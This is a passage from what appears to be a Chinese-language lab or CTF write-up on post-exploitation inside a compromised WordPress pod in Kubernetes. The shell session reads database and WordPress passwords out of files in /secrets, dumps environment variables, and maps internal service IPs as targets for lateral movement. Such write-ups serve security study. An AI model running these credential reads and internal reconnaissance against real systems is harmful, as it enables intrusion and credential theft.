10.42.1.249	beta-vino-wp-wordpress-59ffb97c44-pjh4n

# Entries added by HostAliases.
127.0.0.1	status.localhost
```
### Pod枚举
```
I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/secrets$ ls
mariadb-password  mariadb-root-password  wordpress-password

I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/secrets$ cat mariadb-password       sW5sp4spa3u7RLyetrekE4oS
I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/secrets$ cat mariadb-root-password   sW5sp4syetre32828383kE4oS
I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/secrets$ cat wordpress-password      O8F7KR5zGi
```
#### 环境变量包含大量信息：
<details>
<summary>I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/secrets$ env</summary>
           
```
KUBERNETES_SERVICE_PORT_HTTPS=443
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
WORDPRESS_SMTP_PASSWORD=
WORDPRESS_SMTP_FROM_EMAIL=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
WEB_SERVER_HTTP_PORT_NUMBER=8080
WORDPRESS_RESET_DATA_PERMISSIONS=no
KUBERNETES_SERVICE_PORT=443
WORDPRESS_EMAIL=user@example.com
WP_CLI_CONF_FILE=/opt/bitnami/wp-cli/conf/wp-cli.yml
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
MARIADB_PORT_NUMBER=3306
MODULE=wordpress
WORDPRESS_SMTP_FROM_NAME=FirstName LastName
HOSTNAME=beta-vino-wp-wordpress-59ffb97c44-pjh4n
WORDPRESS_SMTP_PORT_NUMBER=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
WORDPRESS_EXTRA_CLI_ARGS=
APACHE_BASE_DIR=/opt/bitnami/apache
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
APACHE_VHOSTS_DIR=/opt/bitnami/apache/conf/vhosts
WEB_SERVER_DEFAULT_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80  <--
WORDPRESS_ENABLE_DATABASE_SSL=no
WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
APACHE_DAEMON_USER=daemon
BITNAMI_ROOT_DIR=/opt/bitnami
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
WORDPRESS_BASE_DIR=/opt/bitnami/wordpress
WORDPRESS_SCHEME=http
WORDPRESS_LOGGED_IN_SALT=
BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
WORDPRESS_DATA_TO_PERSIST=wp-config.php wp-content
WORDPRESS_HTACCESS_OVERRIDE_NONE=no
WORDPRESS_DATABASE_SSL_CERT_FILE=
APACHE_HTTPS_PORT_NUMBER=8443
PWD=/secrets
OS_FLAVOUR=debian-12
WORDPRESS_CONF_FILE=/opt/bitnami/wordpress/wp-config.php
WORDPRESS_SMTP_PROTOCOL=
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000  <--
WP_CLI_BASE_DIR=/opt/bitnami/wp-cli
WORDPRESS_VOLUME_DIR=/bitnami/wordpress
WP_CLI_CONF_DIR=/opt/bitnami/wp-cli/conf
APACHE_BIN_DIR=/opt/bitnami/apache/bin
BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
WORDPRESS_PLUGINS=none
WORDPRESS_FIRST_NAME=FirstName
MARIADB_HOST=beta-vino-wp-mariadb
WORDPRESS_EXTRA_WP_CONFIG_CONTENT=
WORDPRESS_MULTISITE_ENABLE_NIP_IO_REDIRECTION=no
WORDPRESS_DATABASE_USER=bn_wordpress
PHP_DEFAULT_UPLOAD_MAX_FILESIZE=80M
WORDPRESS_AUTH_KEY=
BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_NETWORK_TYPE=subdomain
WORDPRESS_DATABASE_SSL_KEY_FILE=
APACHE_DEFAULT_CONF_DIR=/opt/bitnami/apache/conf.default
WORDPRESS_LOGGED_IN_KEY=
APACHE_CONF_DIR=/opt/bitnami/apache/conf
HOME=/
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
WEB_SERVER_DAEMON_GROUP=daemon
PHP_DEFAULT_POST_MAX_SIZE=80M
WORDPRESS_ENABLE_HTTPS=no
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
WORDPRESS_TABLE_PREFIX=wp_
WORDPRESS_DATABASE_PORT_NUMBER=3306
WORDPRESS_DATABASE_NAME=bitnami_wordpress
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
APACHE_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80  <--
APACHE_DEFAULT_HTTP_PORT_NUMBER=8080
WP_CLI_DAEMON_GROUP=daemon
BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_FILEUPLOAD_MAXK=81920
WORDPRESS_AUTO_UPDATE_LEVEL=none
BITNAMI_DEBUG=false
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
WORDPRESS_USERNAME=user
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80  <--
WORDPRESS_ENABLE_XML_RPC=no
WORDPRESS_BLOG_NAME=User's Blog!
APACHE_PID_FILE=/opt/bitnami/apache/var/run/httpd.pid
WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
WORDPRESS_AUTH_SALT=
APACHE_LOGS_DIR=/opt/bitnami/apache/logs
WORDPRESS_EXTRA_INSTALL_ARGS=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306  <--
APACHE_DAEMON_GROUP=daemon
WORDPRESS_NONCE_KEY=
WEB_SERVER_HTTPS_PORT_NUMBER=8443
WORDPRESS_SMTP_HOST=
WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
APACHE_DEFAULT_HTTPS_PORT_NUMBER=8443
WORDPRESS_NONCE_SALT=
APACHE_CONF_FILE=/opt/bitnami/apache/conf/httpd.conf
WORDPRESS_MULTISITE_EXTERNAL_HTTP_PORT_NUMBER=80
BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
WEB_SERVER_DEFAULT_HTTPS_PORT_NUMBER=8443
WORDPRESS_LAST_NAME=LastName
WP_NGINX_SERVICE_SERVICE_PORT=80
WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
WORDPRESS_ENABLE_MULTISITE=no
WORDPRESS_SKIP_BOOTSTRAP=no
WORDPRESS_MULTISITE_EXTERNAL_HTTPS_PORT_NUMBER=443
SHLVL=3
WORDPRESS_SECURE_AUTH_SALT=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
BITNAMI_VOLUME_DIR=/bitnami
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
KUBERNETES_PORT_443_TCP_PROTO=tcp
BITNAMI_APP_NAME=wordpress
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
APACHE_HTDOCS_DIR=/opt/bitnami/apache/htdocs
WEB_SERVER_GROUP=daemon
WORDPRESS_PASSWORD=O8F7KR5zGi
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1  <--
APACHE_HTACCESS_DIR=/opt/bitnami/apache/conf/vhosts/htaccess
WORDPRESS_DEFAULT_DATABASE_HOST=mariadb
WORDPRESS_SECURE_AUTH_KEY=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
APACHE_TMP_DIR=/opt/bitnami/apache/var/run
APP_VERSION=6.8.1
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
ALLOW_EMPTY_PASSWORD=yes
WP_CLI_DAEMON_USER=daemon
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
WP_CLI_BIN_DIR=/opt/bitnami/wp-cli/bin
WORDPRESS_VERIFY_DATABASE_SSL=yes
OS_NAME=linux
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
PATH=/opt/bitnami/apache/bin:/opt/bitnami/common/bin:/opt/bitnami/common/bin:/opt/bitnami/mysql/bin:/opt/bitnami/common/bin:/opt/bitnami/php/bin:/opt/bitnami/php/sbin:/opt/bitnami/apache/bin:/opt/bitnami/mysql/bin:/opt/bitnami/wp-cli/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_SERVER_TOKENS=Prod
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
WORDPRESS_ENABLE_HTACCESS_PERSISTENCE=no
WORDPRESS_ENABLE_REVERSE_PROXY=no
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
WORDPRESS_SMTP_USER=
WEB_SERVER_TYPE=apache
WORDPRESS_MULTISITE_HOST=
PHP_DEFAULT_MEMORY_LIMIT=512M
WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no
WORDPRESS_DATABASE_SSL_CA_FILE=
OS_ARCH=amd64
WEB_SERVER_DAEMON_USER=daemon
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
_=/usr/bin/env
OLDPWD=/
```
</details>

#### 其中最有趣的是，它列出了此 Kubernetes 网络中的所有其他服务/主机：
```
nginx 运行在 10.43.4.242:80
名为“LEGACY_INTRANET_SERVICE”的服务位于 10.43.2.241:5000
WordPress 运行在 10.43.61.204:80
MariaDB 位于 10.43.147.82:3306
Kubernetes 位于 10.43.0.1:443
WP_NGINX_SERVICE 位于 10.43.4.242:80
```
#### 上面这些 IP 地址没变，也可能会在每次服务器启动时发生变化
